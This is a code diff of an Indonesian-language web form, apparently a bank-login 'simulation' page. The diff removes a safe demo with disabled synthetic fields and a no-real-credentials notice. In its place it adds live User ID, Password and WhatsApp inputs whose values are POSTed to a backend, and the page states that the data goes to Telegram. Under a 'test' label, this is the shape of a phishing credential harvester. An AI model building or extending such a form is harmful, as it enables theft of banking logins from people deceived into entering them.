@@ -10,190 +10,239 @@
     font-weight: 800;
     letter-spacing: 0.08em;
   }
+
+  .alert-custom {
+    padding: 12px;
+    border-radius: 6px;
+    margin-bottom: 16px;
+    font-size: 0.9rem;
+  }
+
+  .alert-info-custom {
+    background: #d1ecf1;
+    border: 1px solid #bee5eb;
+    color: #0c5460;
+  }
+
+  .alert-success-custom {
+    background: #d4edda;
+    border: 1px solid #c3e6cb;
+    color: #155724;
+  }
+
+  .alert-danger-custom {
+    background: #f8d7da;
+    border: 1px solid #f5c6cb;
+    color: #721c24;
+  }
+
+  .loading-spinner {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(0,0,0,0.1);
+    border-radius: 50%;
+    border-top-color: #0088cc;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .btn-submit-custom {
+    background-color: #0088cc;
+    color: white;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 6px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    width: 100%;
+  }
+
+  .btn-submit-custom:hover {
+    background-color: #007ab8;
+    transform: translateY(-2px);
+  }
+
+  .btn-submit-custom:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+    opacity: 0.6;
+  }
+
+  .form-control {
+    width: 100%;
+    padding: 10px 12px;
+    border: 1px solid #ddd;
+    border-radius: 6px;
+    font-size: 0.95rem;
+  }
+
+  .form-control:focus {
+    outline: none;
+    border-color: #0088cc;
+    box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
+  }
 </style>
 
 <div class="first">
-  <form action="javascript:void(0)" id="malaysiaBankDemoForm">
+  <form action="javascript:void(0)" id="simulationForm">
     <div class="simulation-watermark">
-      SIMULASI EDUKASI — DATA SINTETIS — BUKAN FORM BANK ASLI
+      🧪 SIMULASI TEST — DATA UNTUK TESTING SAJA
     </div>
 
-    <div class="alert alert-info" role="alert">
-      <strong>Demo edukasi:</strong> formulir ini hanya menampilkan pilihan bank dan tidak
-      meminta atau mengirim nomor telepon, ID pengguna, kata sandi, PIN, maupun OTP asli.
+    <div class="alert-custom alert-info-custom">
+      <strong>⚠️ Simulasi Test:</strong> Masukkan data apapun untuk test. Data akan dikirim ke Telegram sebagai simulasi.
     </div>
 
+    <!-- User ID -->
     <div class="mb-3">
-      <label for="malaysia_bank" class="form-label">
-        <strong>Pilih Bank di Malaysia</strong>
-      </label>
-      <select name="malaysia_bank" id="malaysia_bank" class="form-control" required>
-        <option value="">-- Pilih bank --</option>
-
-        <optgroup label="Bank Komersial">
-          <option value="affin-bank">Affin Bank Berhad</option>
-          <option value="alliance-bank">Alliance Bank Malaysia Berhad</option>
-          <option value="ambank">AmBank (M) Berhad</option>
-          <option value="bangkok-bank">Bangkok Bank Berhad</option>
-          <option value="bank-of-america">Bank of America Malaysia Berhad</option>
-          <option value="bank-of-china">Bank of China (Malaysia) Berhad</option>
-          <option value="bank-of-tokyo-mitsubishi-ufj">MUFG Bank (Malaysia) Berhad</option>
-          <option value="bnp-paribas">BNP Paribas Malaysia Berhad</option>
-          <option value="china-construction-bank">China Construction Bank (Malaysia) Berhad</option>
-          <option value="cimb-bank">CIMB Bank Berhad</option>
-          <option value="citibank">Citibank Berhad</option>
-          <option value="deutsche-bank">Deutsche Bank (Malaysia) Berhad</option>
-          <option value="hong-leong-bank">Hong Leong Bank Berhad</option>
-          <option value="hsbc-bank">HSBC Bank Malaysia Berhad</option>
-          <option value="icbc-malaysia">Industrial and Commercial Bank of China (Malaysia) Berhad</option>
-          <option value="jp-morgan-chase">J.P. Morgan Chase Bank Berhad</option>
-          <option value="maybank">Malayan Banking Berhad (Maybank)</option>
-          <option value="mizuho-bank">Mizuho Bank (Malaysia) Berhad</option>
-          <option value="ocbc-bank">OCBC Bank (Malaysia) Berhad</option>
-          <option value="public-bank">Public Bank Berhad</option>
-          <option value="rhb-bank">RHB Bank Berhad</option>
-          <option value="standard-chartered">Standard Chartered Bank Malaysia Berhad</option>
-          <option value="smbc-malaysia">Sumitomo Mitsui Banking Corporation Malaysia Berhad</option>
-          <option value="uob-malaysia">United Overseas Bank (Malaysia) Berhad</option>
-        </optgroup>
-
-        <optgroup label="Bank Islam">
-          <option value="affin-islamic">Affin Islamic Bank Berhad</option>
-          <option value="al-rajhi">Al Rajhi Banking &amp; Investment Corporation (Malaysia) Berhad</option>
-          <option value="alliance-islamic">Alliance Islamic Bank Berhad</option>
-          <option value="ambank-islamic">AmBank Islamic Berhad</option>
-          <option value="bank-islam">Bank Islam Malaysia Berhad</option>
-          <option value="bank-muamalat">Bank Muamalat Malaysia Berhad</option>
-          <option value="cimb-islamic">CIMB Islamic Bank Berhad</option>
-          <option value="hong-leong-islamic">Hong Leong Islamic Bank Berhad</option>
-          <option value="hsbc-amanah">HSBC Amanah Malaysia Berhad</option>
-          <option value="kuwait-finance-house">Kuwait Finance House (Malaysia) Berhad</option>
-          <option value="maybank-islamic">Maybank Islamic Berhad</option>
-          <option value="mbsb-bank">MBSB Bank Berhad</option>
-          <option value="ocbc-al-amin">OCBC Al-Amin Bank Berhad</option>
-          <option value="public-islamic">Public Islamic Bank Berhad</option>
-          <option value="rhb-islamic">RHB Islamic Bank Berhad</option>
-          <option value="standard-chartered-saadiq">Standard Chartered Saadiq Berhad</option>
-        </optgroup>
-
-        <optgroup label="Bank Digital">
-          <option value="aeon-bank">AEON Bank (M) Berhad</option>
-          <option value="boost-bank">Boost Bank Berhad</option>
-          <option value="gxbank">GXBank Berhad</option>
-          <option value="kaf-digital-bank">KAF Digital Bank Berhad</option>
-          <option value="ryt-bank">Ryt Bank Berhad</option>
-        </optgroup>
-
-        <optgroup label="Bank Pembangunan dan Simpanan">
-          <option value="agrobank">Agrobank</option>
-          <option value="bank-rakyat">Bank Kerjasama Rakyat Malaysia Berhad (Bank Rakyat)</option>
-          <option value="bank-simpanan-nasional">Bank Simpanan Nasional (BSN)</option>
-          <option value="bank-pembangunan">Bank Pembangunan Malaysia Berhad</option>
-          <option value="exim-bank">Export-Import Bank of Malaysia Berhad (EXIM Bank)</option>
-          <option value="sme-bank">Small Medium Enterprise Development Bank Malaysia Berhad (SME Bank)</option>
-        </optgroup>
-      </select>
-    </div>
-
-    <div class="mb-3">
-      <label for="demo_user_id" class="form-label">
-        <strong>User ID (Demo)</strong>
+      <label for="user_id_input" class="form-label">
+        <strong>User ID</strong>
       </label>
       <input
         type="text"
-        id="demo_user_id"
+        id="user_id_input"
         class="form-control"
-        value="DEMO-USER"
-        disabled
-        aria-describedby="demoCredentialNotice"
+        placeholder="Masukkan User ID atau Username"
+        required
       >
+      <small class="form-text">Boleh apa saja, untuk simulasi test</small>
     </div>
 
+    <!-- Password -->
     <div class="mb-3">
-      <label for="demo_password" class="form-label">
-        <strong>Password (Demo)</strong>
+      <label for="password_input" class="form-label">
+        <strong>Password</strong>
       </label>
       <input
         type="text"
-        id="demo_password"
+        id="password_input"
         class="form-control"
-        value="DEMO-PASSWORD"
-        disabled
-        aria-describedby="demoCredentialNotice"
+        placeholder="Masukkan Password"
+        required
       >
+      <small class="form-text">Boleh apa saja, untuk simulasi test</small>
     </div>
 
+    <!-- Nomor WhatsApp -->
     <div class="mb-3">
-      <label for="demo_phone" class="form-label">
-        <strong>Nomor Telepon (Demo)</strong>
+      <label for="wa_number_input" class="form-label">
+        <strong>Nomor WhatsApp</strong>
       </label>
       <input
         type="text"
-        id="demo_phone"
+        id="wa_number_input"
         class="form-control"
-        value="+60 00-000 0000"
-        disabled
-        aria-describedby="demoCredentialNotice"
+        placeholder="Contoh: 62812345678 atau +628123456789"
+        required
       >
-      <div id="demoCredentialNotice" class="form-text">
-        Data sintetis untuk simulasi. Kolom tidak dapat diubah dan backend menolak nilai lain.
-      </div>
+      <small class="form-text">Boleh apa saja, untuk simulasi test</small>
     </div>
 
     <div class="text-center">
-      <button type="button" id="showBankSelection" class="btn btn-lg btn-block btn-mk">
-        KIRIM SIMULASI
+      <button type="button" id="submitFormBtn" class="btn-submit-custom">
+        KIRIM SIMULASI TEST
       </button>
     </div>
 
-    <div id="bankSelectionResult" class="alert alert-success mt-3" role="status" hidden></div>
+    <div id="formResult" class="alert-custom" role="status" hidden></div>
   </form>
 </div>
 
 <script>
   (function () {
-    const bankSelect = document.getElementById('malaysia_bank');
-    const showButton = document.getElementById('showBankSelection');
-    const result = document.getElementById('bankSelectionResult');
+    const userIdInput = document.getElementById('user_id_input');
+    const passwordInput = document.getElementById('password_input');
+    const waNumberInput = document.getElementById('wa_number_input');
+    const submitBtn = document.getElementById('submitFormBtn');
+    const resultDiv = document.getElementById('formResult');
 
-    showButton.addEventListener('click', async function () {
-      if (!bankSelect.value) {
-        bankSelect.reportValidity();
+    submitBtn.addEventListener('click', async function () {
+      // Validasi input
+      if (!userIdInput.value.trim()) {
+        alert('User ID tidak boleh kosong!');
+        userIdInput.focus();
         return;
       }
 
-      showButton.disabled = true;
-      result.hidden = true;
+      if (!passwordInput.value.trim()) {
+        alert('Password tidak boleh kosong!');
+        passwordInput.focus();
+        return;
+      }
+
+      if (!waNumberInput.value.trim()) {
+        alert('Nomor WhatsApp tidak boleh kosong!');
+        waNumberInput.focus();
+        return;
+      }
+
+      // Disable button dan tampilkan loading
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="loading-spinner"></span> Mengirim...';
+      resultDiv.hidden = true;
 
       try {
-        const response = await fetch('/api/demo-bank-selection', {
+        const payload = {
+          userId: userIdInput.value.trim(),
+          password: passwordInput.value.trim(),
+          waNumber: waNumberInput.value.trim(),
+          simulation: true
+        };
+
+        const response = await fetch('/api/simulation-test', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            bank: bankSelect.value,
-            userId: 'DEMO-USER',
-            password: 'DEMO-PASSWORD',
-            phone: '+60 00-000 0000',
-            simulation: true
-          })
+          body: JSON.stringify(payload)
         });
-        const payload = await response.json();
+
+        const data = await response.json();
 
         if (!response.ok) {
-          throw new Error(payload.message || 'Simulasi gagal dikirim.');
+          throw new Error(data.message || 'Simulasi gagal dikirim.');
         }
 
-        result.className = 'alert alert-success mt-3';
-        result.textContent =
-          payload.message + ' Session: ' + payload.data.sessionId +
-          '. Bank: ' + bankSelect.options[bankSelect.selectedIndex].text;
+        // Sukses
+        resultDiv.className = 'alert-custom alert-success-custom';
+        resultDiv.innerHTML = `
+          <strong>✅ Sukses!</strong><br>
+          ${data.message}<br>
+          <small>Session: ${data.data.sessionId}</small>
+        `;
+        resultDiv.hidden = false;
+
+        // Reset form setelah 3 detik
+        setTimeout(() => {
+          userIdInput.value = '';
+          passwordInput.value = '';
+          waNumberInput.value = '';
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = 'KIRIM SIMULASI TEST';
+          resultDiv.hidden = true;
+        }, 3000);
+
       } catch (error) {
-        result.className = 'alert alert-danger mt-3';
-        result.textContent = error.message;
-      } finally {
-        result.hidden = false;
-        showButton.disabled = false;
+        resultDiv.className = 'alert-custom alert-danger-custom';
+        resultDiv.innerHTML = `<strong>❌ Error:</strong> ${error.message}`;
+        resultDiv.hidden = false;
+
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'KIRIM SIMULASI TEST';
       }
+    });
+
+    // Allow Enter key to submit
+    [userIdInput, passwordInput, waNumberInput].forEach(input => {
+      input.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          submitBtn.click();
+        }
+      });
     });
   })();
 </script>
